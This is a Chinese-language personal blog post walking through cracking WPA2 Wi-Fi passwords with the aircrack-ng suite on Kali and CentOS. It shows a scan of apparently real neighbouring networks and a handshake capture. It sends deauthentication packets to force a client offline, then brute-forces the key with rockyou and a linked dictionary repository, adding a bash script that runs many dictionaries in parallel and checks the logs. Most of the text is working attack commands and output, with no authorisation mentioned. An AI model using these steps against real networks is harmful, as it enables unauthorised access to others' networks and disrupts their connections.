---
title: "暴力破解 Wifi密码，可行性不高"
date: 2022-02-26 22:07:09.207000
draft: false
bookComments: true
tags: ["2023-05-07从halo博客迁移"]
# bookSearchExclude: false
---
## 设置使用外置网卡

![image-20210529221059025](/images/567e5c6e3afd4fe9b5e859e2cf72d5fe.png)


## 操作步骤

查看支持的网卡

```bash
kali@kali:~$ sudo airmon-ng

PHY     Interface       Driver          Chipset

phy1    wlan0          rt2800usb       Ralink Technology, Corp. RT2870/RT3070
```



启动网卡监听模式

```bash
sudo airmon-ng start wlan0
```



再次使用 `sudo ifconfig` 查看时，wlan0 会变成 wlan0mon。

```bash
kali@kali:~$ sudo ifconfig                                                                                                                                 
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                                                                                                 
        inet 192.168.183.128  netmask 255.255.255.0  broadcast 192.168.183.255
        inet6 fe80::20c:29ff:fe01:5e1b  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:01:5e:1b  txqueuelen 1000  (Ethernet)
        RX packets 86  bytes 6556 (6.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 45  bytes 4234 (4.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12  bytes 556 (556.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 556 (556.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=867<UP,BROADCAST,NOTRAILERS,RUNNING,PROMISC,ALLMULTI>  mtu 1500
        unspec 00-26-66-47-9F-53-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 4259  bytes 580060 (566.4 KiB)
        RX errors 0  dropped 1640  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```



扫描wifi

```bash
sudo airodump-ng wlan0mon
```



```bash
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                      
 F8:8C:21:8F:43:67  -44       39       15    0   1  720   WPA2 CCMP   PSK  12321                                                                           
 FA:8C:21:AF:43:67  -45       33        0    0   1  720   WPA2 CCMP   PSK  <length:  0>                                                                    
 50:D2:F5:8A:DF:2F  -58       32       10    0   1  270   WPA2 CCMP   PSK  小米中继                                                                        
 48:0E:EC:20:4E:66  -74       30        0    0   1  270   WPA2 CCMP   PSK  TP-LINK_4E66                                                                    
 F4:83:CD:83:BC:6A  -75       34        1    0   6  270   WPA2 CCMP   PSK  asddsaa                                                                         
 50:3A:A0:07:54:92  -78       35       70    0  11  270   WPA2 CCMP   PSK  DING                                                                            
 8C:A6:DF:EB:C6:60  -80       27        0    0  11  405   WPA2 CCMP   PSK  TP-LINK_C660                                                                    
 5C:DE:34:B0:20:FB  -80       16        0    0   4  270   WPA2 CCMP   PSK  MERCURY_20                                                                      
 DC:73:85:85:16:EC  -82       27        6    0   6  400   WPA2 CCMP   PSK  CMCC-ML9Y                                                                       
 DC:73:85:85:16:F1  -84       31        0    0   6  360   WPA2 CCMP   PSK  <length:  0>                                                                    
 92:F0:52:E9:9D:9C  -84       13        0    0   1  180   WPA2 CCMP   PSK  mz16p                                                                           
 94:D9:B3:B7:1F:75  -84       30        4    0  11  270   WPA2 CCMP   PSK  407                                                                             
 C0:A5:DD:73:DC:30  -86       16        3    0  10  270   WPA2 CCMP   PSK  404                                                                             
 8C:DE:F9:32:FA:7A  -86       24        0    0   9  360   WPA  CCMP   PSK  Gordon                                                                          
 44:F9:71:79:D3:54  -87       30        6    0   6  540   WPA2 CCMP   PSK  feng                                                                            
 46:F9:71:59:D3:54  -87       21       10    0   6  540   WPA2 CCMP   PSK  feng                                                                            
 C0:51:7E:64:F3:31  -87       30        0    0   3  130   WPA2 CCMP   PSK  EZVIZ-16                                                                        
 DC:FE:18:BB:E9:A3  -87        2        0    0   1  405   WPA2 CCMP   PSK  408                                                                             
 92:DE:F9:32:FA:7A  -88       20        0    0   9  360   OPN              <length:  0>                                                                    
 6C:59:40:EA:85:9C  -89        1        0    0  12  270   WPA2 CCMP   PSK  MERCURY_859C                                                                    
 08:10:79:46:73:CD  -89       33        0    0   1  270   WPA2 CCMP   PSK  asdfghjkl                                                                       
 36:F2:EA:EB:EF:BC  -91        1        0    0   6  360   WPA2 CCMP   PSK  OnePlus 9                                                                       
 00:4B:F3:2B:7F:9A  -86        3        1    0   1  270   WPA2 CCMP   PSK  306                                                                             
 66:6E:97:AF:D8:27  -86        2        0    0   1  540   WPA2 CCMP   PSK  <length:  0>      
```



选择一个PWR的值的绝对值小于70的wifi破解



抓包

```bash
sudo airodump-ng -c {CH} --bssid {BSSID} -w {要保存握手包的目录} 无线网卡名称

sudo airodump-ng -c 1 --bssid F8:8C:21:8F:43:67 -w /home/kali/me/12321  wlan0mon
```



这里是空的，没有抓取成功。

![image-20210529223055505](/images/d3b1fb366bd444a8855481e3b9e7f616.png)




攻击网络下线，辅助抓包(这里要重新开启一个窗口)

```bash
sudo aireplay-ng -0 {发送反认证包的个数} -a {BSSID} -c {强制下线的MAC地址（STATION下面的地址）} 无线网卡名称
sudo aireplay-ng -0 10 -a F8:8C:21:8F:43:67 -c 52:D2:F5:0A:DF:2F wlan0mon
```



抓取成功，接下来是破解了。

![image-20210529223311113](/images/1b1805e030ef42169e515b54fccb3be5.png)





暴力破解

```bash
sudo aircrack-ng -w 密钥文件.txt 抓到的包数据.cap
sudo aircrack-ng -w rockyou.txt me-01.cap
```





## centos 7 安装 aircrack-ng 

1、添加源

```bash
curl -s https://packagecloud.io/install/repositories/aircrack-ng/release/script.rpm.sh | sudo bash
```



2、安装需要wireless-tools，

```bash
yum install wireless-tools 
```



3、安装aircrack-ng

```bash
yum install aircrack-ng
```



4、查看版本

```bash
aircrack-ng 

Aircrack-ng 1.6  - (C) 2006-2020 Thomas d'Otreppe
https://www.aircrack-ng.org
```



## 主机之间互传文件



```bash
scp   本机文件路径  账号@ip:远程主机文件路径
scp  /home/file root@xxx.xxx.xxx.xxx:/home/test/
```



## 后台启动

```bash
nohup  aircrack-ng -w rockyou.txt asddsaa-01.cap > asddsaa-01-log.file 2>&1 &
```



脚本跑密码，密码字典放在key文件夹中

```bash
#!/bin/bash
read -p "输入要破解的cap文件名称:" file
read -p "输入蓝牙名称:" name
for key in `ls key`
do
  nohup  aircrack-ng -w ./key/$key $file > ./log/$name-$key.log 2>&1 &
done
```



查找是否包含成功的文件

```bash
c=0
for key in `ls log`
do
  if [ `grep -c 'KEY NOT FOUND' ./log/$key` -eq 0 ];then
    echo -e "\033[33m $key not have \033[0m"
    c=$(($c+1)) 
  else  
    echo $key have
  fi  
done
echo "可能有密码的有： $c 个"

n=$(ps -ef|grep aircrack-ng|wc -l)
echo "未完成的任务有：$(($n-1)) 个"

```







密码字典：

```bash
https://github.com/yuanmoc/wifiDictionaries
```





